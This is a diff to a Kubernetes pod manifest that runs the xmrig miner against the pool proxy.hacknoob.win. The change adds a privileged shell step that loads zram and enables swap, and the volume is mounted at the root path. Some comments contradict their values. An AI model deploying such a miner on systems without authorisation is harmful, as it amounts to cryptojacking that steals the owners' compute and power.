@@ -16,27 +16,33 @@ spec:
   - name: xmrig-container-1
     image: alpine
     command:
-    - /home/worker1/xmrig/build/xmrig
-    - -o
-    - proxy.hacknoob.win:5551
-    - -u
-    - slave1+150
-    - -a
-    - rx/0          # Use a lower memory algorithm if possible
-    - --threads
-    - "1"            # Set to 1 thread to reduce memory
-    - --no-huge-pages
-    - --cpu-priority
-    - "5"            # Lower CPU priority
-    - --donate-level
-    - "0"            # Set donate level to zero to save resources
+    - /bin/sh
+    - -c
+    - |
+      # Install necessary packages
+      apk add --no-cache util-linux zram-tools && \
+      # Load zram module
+      modprobe zram && \
+      # Configure zram swap device
+      echo 512M > /sys/block/zram0/disksize && \
+      mkswap /dev/zram0 && \
+      swapon /dev/zram0 && \
+      # Start xmrig
+      /home/worker1/xmrig/build/xmrig \
+      -o proxy.hacknoob.win:5551 \
+      -u slave1+150 \
+      -a rx/0 \
+      --threads "1" \
+      --no-huge-pages \
+      --cpu-priority "5" \
+      --donate-level "0"
     resources:
       limits:
         memory: "257Mi"   # Set a limit under 100Mi
         cpu: "500m"      # Limit to half a CPU core
     volumeMounts:
     - name: xmrig-volume-1
-      mountPath: /
+      mountPath: /  # Adjust to correct path as needed
   restartPolicy: Always   # Automatically restart if the Pod fails
   volumes:
   - name: xmrig-volume-1
